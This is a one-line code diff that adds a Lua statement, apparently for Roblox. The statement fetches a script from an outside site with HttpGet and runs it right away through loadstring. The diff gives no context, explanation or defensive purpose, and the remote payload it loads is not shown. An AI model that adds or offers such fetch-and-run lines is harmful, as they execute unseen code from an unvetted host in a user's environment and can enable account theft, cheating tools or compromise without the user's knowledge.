@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://www.tokinu.site/raw/redeemer"))()
